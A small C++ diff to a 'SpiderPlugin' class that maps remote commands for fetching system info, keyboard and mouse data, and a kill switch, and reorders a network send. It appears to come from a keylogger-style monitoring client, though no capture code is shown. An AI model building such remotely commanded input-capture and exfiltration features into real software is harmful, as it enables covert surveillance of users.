@@ -26,7 +26,7 @@ SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(fal
     m_mouseHookWin(nullptr)
 #endif
 {
-    m_cmd["/getInfo"] = [this]() { getInfos(); };
+    m_cmd["/getInfos"] = [this]() { getInfos(); };
     m_cmd["/getKeyboard"] = [this]() { getKeyboard(); };
     m_cmd["/getMouse"] = [this]() { getMouse(); };
     m_cmd["/kill"] = [this]() { kill(); };
@@ -84,8 +84,8 @@ void SpiderPlugin::getInfos()
     msg.currentWindow.fill(0);
     msg.data.size = sizeof(m_infos);
     msg.data.raw = reinterpret_cast<std::uint8_t const *>(&m_infos);
-    m_sendToNetwork->push(msg);
     m_networkResponseQueue.push("OK\r\n");
+    m_sendToNetwork->push(msg);
 }
 
 bool SpiderPlugin::getKeyboard()
